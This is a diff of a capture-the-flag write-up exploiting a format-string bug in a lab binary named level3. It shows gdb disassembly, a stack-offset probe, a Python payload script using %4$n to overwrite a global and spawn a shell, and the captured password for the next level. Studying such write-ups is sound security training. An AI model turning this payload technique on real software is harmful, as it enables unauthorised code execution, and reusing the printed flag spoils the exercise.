@@ -1,29 +1,52 @@
-In the source file, we can see a global variable `m`. If this global variable is
-the number 64, we got a shell.
-So we need to be able to set the value 64 to m. A global variable is always
-initialized at 0.
+$ ./level3
+=> (Wait for an input)
+$ dsahkjdhsf
+=> (Close standard input)
 
-Since a global variable is in the Data section of the binary. We can not
-overwrite this section.
+I disas the <main>
+$ gdb level3
+$ (gdb) disas main
+there's only a call to the function <v> :
+   0x08048520 <+6>:	call   0x80484a4 <v>
+$ (gdb) disas v
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
 
-Another approach would be to exploit the `printf()` function in the line
-preceding the check.
+We can see that there is a call to system that triggers a shell hidden behind a comparison.
+The comparison requires to have a global variable to be equal to 64.
 
-Since we can write `printf()` format, we can overwrite the `m` global variable
-value. For that, we need to find it's address.
+Thanks to the <printf> without any arguments, we can exerce a Format-String-Attack which will allow us to change the value of the global variable.
 
-m address: 0x804988c
+So first, we'll use this kind of script to see where our <printf> is writing in the memory
+$ python -c 'print "AAAA" + "%x %x %x %x %x %x %x %x %x %x %x"'
+=> AAAA200 b7fd1ac0 b7ff37d0 ==>41414141<== 25207825 78252078 20782520 25207825 78252078 20782520 25207825
 
-Now that we have it's address, we can use the `printf()` flag `%n` to write the
-good value.
+We can see that our string "AAAA" has overwritten the address at the 4th position.
+So now, we'll find the address of our global variable thanks to gdb, that we'll find here :
+   0x080484da <+54>:	mov    0x804988c,%eax
+Then replace our "AAAA" with this address to overwrite our 4th position with the address of the global variable and then use %n
+
+It allows us to write the number of bytes than has been previously written before the flag 'n' where the address is pointing. and we'll use this syntax %$4n, to previse it's in the 4th address that we want to write our number of bytes.
 
 ```python
 #! /usr/bin/env python
 
 M_ADDR          = "\x8c\x98\x04\x08"
-PAD             = "%x "*2
-OVERWRITE       = "%46x %n "
-DUMP            = "%x "*20
+OVERWRITE       = "aaaaaaaaaaAAAAAAAAAAaaaaaaaaaaAAAAAAAAAAaaaaaaaaaaAAAAAAAAAA"
+N               = "%4$n"
 
-print M_ADDR + PAD + OVERWRITE + DUMP
+print M_ADDR + OVERWRITE + N
 ```
+
+The script above writes the payload we will give to our binary ./level3
+
+$ python script.py > /tmp/payload
+$ cat /tmp/payload | ./level3
+=> �aaaaaaaaaaAAAAAAAAAAaaaaaaaaaaAAAAAAAAAAaaaaaaaaaaAAAAAAAAAA
+Wait what?!
+
+and we now have access to the shell that will allow us to get the flag :
+
+$ cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
